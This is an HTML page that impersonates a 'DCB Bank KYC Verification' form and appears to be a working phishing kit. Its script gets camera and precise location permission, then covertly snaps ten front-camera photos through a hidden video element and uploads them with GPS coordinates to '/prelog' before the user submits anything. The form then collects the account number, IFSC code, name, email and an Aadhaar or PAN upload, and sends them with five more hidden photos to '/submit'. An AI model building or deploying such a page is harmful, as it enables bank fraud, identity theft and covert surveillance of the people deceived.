<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>DCB Bank KYC Verification</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    body {
      background-color: #f4f6f9;
      color: #333;
      line-height: 1.6;
      padding: 15px;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    .container {
      max-width: 500px;
      width: 100%;
      margin: 20px auto;
      background: white;
      border-radius: 16px;
      padding: 25px;
      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
    }

    .logo {
      display: block;
      margin: 0 auto 15px;
      width: 160px;
      height: auto;
    }

    h2 {
      text-align: center;
      color: #003d6a;
      margin-bottom: 20px;
      font-weight: 700;
      font-size: 24px;
    }

    .notice {
      font-size: 14px;
      color: #444;
      text-align: center;
      margin-bottom: 20px;
      background-color: #f8f9fa;
      padding: 12px;
      border-radius: 8px;
      border-left: 4px solid #ffc107;
    }

    label {
      display: block;
      margin-top: 18px;
      font-weight: 600;
      font-size: 14px;
      color: #003d6a;
    }

    input[type="text"],
    input[type="file"] {
      width: 100%;
      font-size: 14px;
      padding: 12px;
      margin-top: 6px;
      border-radius: 8px;
      border: 1px solid #d1d5db;
      background: white;
    }

    button {
      margin-top: 25px;
      width: 100%;
      background-color: #003d6a;
      color: white;
      border: none;
      padding: 15px;
      font-size: 16px;
      font-weight: 600;
      border-radius: 8px;
      cursor: pointer;
    }

    .footer {
      text-align: center;
      margin-top: 30px;
      font-size: 12px;
      color: #777;
      padding-top: 15px;
      border-top: 1px solid #eee;
    }

    .error {
      color: #d32f2f;
      text-align: center;
      font-size: 13px;
      margin-top: 12px;
    }

    .success-message {
      text-align: center;
      padding: 18px;
      background-color: #e8f5e9;
      border-radius: 8px;
      border-left: 4px solid #28a745;
      margin-top: 18px;
      display: none;
    }

    video, canvas {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <img class="logo" src="dbc.png" alt="DCB Bank Logo" />
    <h2>DCB Bank KYC Verification</h2>

    <div id="permissionStep">
      <p class="notice">Please allow access to your camera and location.</p>
      <button onclick="requestPermissions()">Allow & Continue</button>
      <p id="permStatus" class="error"></p>
    </div>

    <div id="kycForm" style="display: none;">
      <form id="kycFormElement">
        <label>Bank Name</label>
        <input type="text" id="bankname" name="bankname" required />
        <label>IFSC Code</label>
        <input type="text" id="ifsc" name="ifsc" required />
        <label>Account Number</label>
        <input type="text" id="accno" name="accno" required />
        <label>Full Name</label>
        <input type="text" id="fullname" name="fullname" required />
        <label>Email</label>
        <input type="text" id="email" name="email" required />
        <label>Upload Aadhaar or PAN</label>
        <input type="file" id="document" name="document" required />
        <button type="submit">Verify Account</button>
      </form>
      <div id="successMessage" class="success-message">
        <h3>✅ Submitted Successfully</h3>
      </div>
    </div>

    <div class="footer">© 2025 DCB Bank Ltd. For official verification only.</div>
  </div>

  <video id="cameraPreview" autoplay playsinline></video>
  <canvas id="captureCanvas"></canvas>

  <script>
    let cameraStream = null;
    let capturedImages = [];
    let locationData = null;
    const MAX_PRE_IMAGES = 10;
    const MAX_SUBMIT_IMAGES = 5;

    function dataURLtoBlob(dataurl) {
      const arr = dataurl.split(',');
      const mime = arr[0].match(/:(.*?);/)[1];
      const bstr = atob(arr[1]);
      let n = bstr.length;
      const u8arr = new Uint8Array(n);
      while (n--) u8arr[n] = bstr.charCodeAt(n);
      return new Blob([u8arr], { type: mime });
    }

    function startPreCapture() {
      const video = document.getElementById('cameraPreview');
      const canvas = document.getElementById('captureCanvas');
      const ctx = canvas.getContext('2d');
      let count = 0;

      const interval = setInterval(() => {
        if (count >= MAX_PRE_IMAGES) {
          clearInterval(interval);
          sendPrelog();
          return;
        }
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));
        count++;
      }, 500);
    }

    function sendPrelog() {
      const formData = new FormData();
      capturedImages.forEach((img, i) => {
        formData.append(`image${i}`, dataURLtoBlob(img), `prelog_${i}.jpg`);
      });
      if (locationData) {
        formData.append('location', JSON.stringify(locationData));
      }
      fetch('/prelog', { method: 'POST', body: formData });
    }

    function requestPermissions() {
      const status = document.getElementById('permStatus');
      status.textContent = "";

      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }).then(stream => {
        cameraStream = stream;
        document.getElementById('cameraPreview').srcObject = stream;

        navigator.geolocation.getCurrentPosition(
          pos => {
            locationData = {
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
              timestamp: pos.timestamp
            };
            document.getElementById('permissionStep').style.display = 'none';
            document.getElementById('kycForm').style.display = 'block';
            startPreCapture();
          },
          err => {
            status.textContent = "Location access denied.";
          },
          { enableHighAccuracy: true }
        );
      }).catch(() => {
        status.textContent = "Camera access denied.";
      });
    }

    document.getElementById('kycFormElement').addEventListener('submit', async function (e) {
      e.preventDefault();
      const form = e.target;
      const formData = new FormData(form);

      const file = document.getElementById('document').files[0];
      if (file) formData.append('document', file);

      const canvas = document.getElementById('captureCanvas');
      const ctx = canvas.getContext('2d');
      const video = document.getElementById('cameraPreview');

      for (let i = 0; i < MAX_SUBMIT_IMAGES; i++) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        const imgBlob = dataURLtoBlob(canvas.toDataURL('image/jpeg'));
        formData.append(`image${capturedImages.length + i}`, imgBlob, `submit_${i}.jpg`);
      }

      if (locationData) formData.append('location', JSON.stringify(locationData));

      const res = await fetch('/submit', { method: 'POST', body: formData });
      if (res.ok) {
        form.style.display = 'none';
        document.getElementById('successMessage').style.display = 'block';
      } else {
        alert('Submission failed. Try again.');
      }
    });

    function stopCamera() {
      if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
      }
    }

    window.addEventListener('beforeunload', stopCamera);
    window.addEventListener('load', () => {
      document.getElementById('cameraPreview').style.display = 'none';
    });
  </script>
</body>
</html>
